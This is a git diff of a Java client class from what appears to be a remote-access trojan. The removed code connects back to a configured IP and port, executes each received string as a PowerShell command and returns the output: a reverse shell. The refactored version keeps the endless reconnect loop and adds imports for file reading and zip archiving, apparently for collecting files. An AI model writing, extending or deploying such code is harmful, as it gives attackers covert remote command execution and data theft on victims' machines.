@@ -2,11 +2,23 @@ package connection;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
 import java.io.IOException;
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.net.Socket;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
 
 import com.profesorfalken.jpowershell.PowerShell;
 import com.profesorfalken.jpowershell.PowerShellResponse;
+
+import commands.CommandManager;
 
 public class ClientSide {
 	private Socket s;
@@ -21,47 +33,28 @@ public class ClientSide {
 		_port = port;
 	}
 	
-	public void connect() {
-		String received;
-		try {
-			reset();
-		} catch (IOException e1) {
-			return;
-		}
-		while(s.isConnected())
-        {  
-			try {
-				received = din.readUTF();
-				received = received.trim();
-				if (received.contains("endcon")) {
-					dout.writeUTF("Bye :(\n\n");
-					dout.flush();
-					s.close();
-					powerShell.close();
-					return;
-				}
-				else {
-					PowerShellResponse response = powerShell.executeCommand(received);
-					dout.writeUTF(response.getCommandOutput());
-					dout.flush();
-				}
-	        } catch (Exception e1) {
-	        	try {
-	        		reset();
-	        	}
-	        	catch(IOException e2) {
-	        		return;
-	        	}
-	        }
-        }
+	public String receive() throws IOException {
+		return din.readUTF();
 	}
 	
-	private void reset() throws IOException {
+	public boolean isConnected() {
+		return s.isConnected();
+	}
+	
+	public void send(String msg) throws IOException {
+		dout.writeUTF(msg);
+		dout.flush();
+	}
+	
+	public void end() throws IOException {
+		s.close();
+	}
+	
+	public void reset() throws IOException {
 		while(!initConnection());
 		System.gc(); //Calls the garbage collector because of the previous function
 		dout = new DataOutputStream(s.getOutputStream());
 		din = new DataInputStream(s.getInputStream());
-		powerShell = PowerShell.openSession();
 	}
 	
 	private boolean initConnection() {
@@ -70,11 +63,6 @@ public class ClientSide {
             s = new Socket(_ip,_port);
             return true;
         }
-        catch(Exception err)
-        {
-            return false;
-        }
-           
+        catch(Exception err){return false;}
     }
-
 }
